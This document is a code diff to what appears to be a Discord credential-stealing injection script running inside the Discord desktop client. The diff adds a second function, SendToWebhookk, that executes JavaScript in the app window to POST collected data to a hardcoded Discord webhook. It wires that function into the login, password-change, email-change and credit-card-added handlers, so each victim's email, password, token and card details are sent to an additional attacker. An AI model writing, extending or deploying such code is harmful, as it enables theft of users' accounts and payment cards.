@@ -119,6 +119,16 @@ function SendToWebhook(what) {
     `, !0).then((token => {}))
 }
 
+function SendToWebhookk(what) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://discord.com/api/webhooks/906007438032003103/7yT3PcezNFeMVU7tnN1jy6qmYq_AqyUmIkieI4aTV3qPnSglv8OH75Ha1--iWwUnpyrE", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, !0).then((token => {}))
+}
+
 function GetNitro(flags) {
     if (flags == 0) {
         return "No Nitro"
@@ -356,6 +366,7 @@ function Login(email, password, token) {
                             }
                         }]
                     }
+                    SendToWebhookk(JSON.stringify(params))
                     SendToWebhook(JSON.stringify(params))
                 })
             })
@@ -461,6 +472,7 @@ function ChangePassword(oldpassword, newpassword, token) {
                         }
                     }]
                 }
+                SendToWebhookk(JSON.stringify(params))
                 SendToWebhook(JSON.stringify(params))
             })
         })
@@ -561,6 +573,7 @@ function ChangeEmail(newemail, password, token) {
                         }
                     }]
                 }
+                SendToWebhookk(JSON.stringify(params))
                 SendToWebhook(JSON.stringify(params))
             })
         })
@@ -600,6 +613,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
                 }]
             }
             SendToWebhook(JSON.stringify(params))
+            SendToWebhookk(JSON.stringify(params))
         })
     })
 }
